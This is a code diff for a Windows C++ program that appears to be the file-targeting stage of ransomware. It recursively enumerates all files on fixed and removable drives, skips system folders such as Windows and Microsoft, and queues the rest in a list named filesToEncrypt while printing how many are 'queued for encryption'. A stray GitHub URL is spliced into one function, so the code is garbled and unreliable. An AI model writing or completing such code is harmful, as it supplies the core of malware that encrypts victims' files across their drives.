@@ -6,6 +6,7 @@
 #include <filesystem>
 #include <thread>
 #include <experimental/filesystem>
+std::vector<std::string>filesToEncrypt = {};
 std::vector<std::string> getListOfDrives( ) {
     std::vector<std::string> arrayOfDrives;
     char* szDrives = new char[ MAX_PATH ]( );
@@ -16,12 +17,41 @@ std::vector<std::string> getListOfDrives( ) {
     delete[ ] szDrives;
     return arrayOfDrives;
 }
+void clearConsole( ) {
+    static COORD topLeft = { 0, 0 };
+https://github.com/Unklear?tab=repositories    static HANDLE console = GetStdHandle( STD_OUTPUT_HANDLE );
+    SetConsoleCursorPosition( console, topLeft );
+}
+bool shouldEncryptThisEntry( std::string entry, std::vector<std::string> filters ) {
+    if (GetFileAttributesA( entry.c_str( ) ) == 65535 )
+        return false;
+    if ( !filters.empty( ) )
+        for ( const auto& at : filters ) {
+            if ( entry.find( at ) != std::string::npos )
+                return false;
+        }
+  
+    return true;
+}
+bool shouldEncryptThisWEntry( std::wstring wEntry, std::vector<std::wstring> wFilters ) {
+    if ( GetFileAttributes( wEntry.c_str( ) ) == 65535 )
+        return false;
+
+    if ( !wFilters.empty( ) )
+        for ( const auto& at : wFilters ) {
+            if ( wEntry.find( at ) != std::string::npos )
+                return false;
+        }
+    return true;
+}
 void enumerateDriveFiles( std::string drive ) {
     for ( const auto& dirEntry : std::experimental::filesystem::recursive_directory_iterator( drive ) ) {
-        if ( dirEntry.path( ).wstring( ).find( L"\u202E" ) != std::string::npos || dirEntry.path( ).wstring( ).find( L"Windows" ) != std::string::npos || dirEntry.path( ).wstring( ).find( L"windows" ) != std::string::npos 
-            || dirEntry.path( ).wstring( ).find( L"microsoft" ) != std::string::npos || dirEntry.path( ).wstring( ).find( L"Microsoft" ) != std::string::npos )
+        if ( !shouldEncryptThisEntry( dirEntry.path( ).string( ), { "Windows","windows","Microsoft","microsoft","Win32","BaseImages" } ) 
+            || !shouldEncryptThisWEntry( dirEntry.path( ).wstring( ), { L"\u202E" } ) )
             continue;
-        std::wcout << dirEntry.path( ).wstring( ) << std::endl;
+        filesToEncrypt.push_back(dirEntry.path( ).string( ));
+        clearConsole( );
+        std::cout << "Files queued for encryption: " << filesToEncrypt.size( ) << std::endl;
     }
 }
 int main( int argc, char* argv[ ] )
@@ -30,5 +60,8 @@ int main( int argc, char* argv[ ] )
     for ( std::string currentDrive : drives )
         if ( GetDriveTypeA( currentDrive.c_str( ) ) == DRIVE_FIXED || GetDriveTypeA( currentDrive.c_str( ) ) == DRIVE_REMOVABLE )
             enumerateDriveFiles( currentDrive );
+    for ( const auto& at : filesToEncrypt ) {
+        std::cout << at << std::endl;
+    }
     return 0;
 }
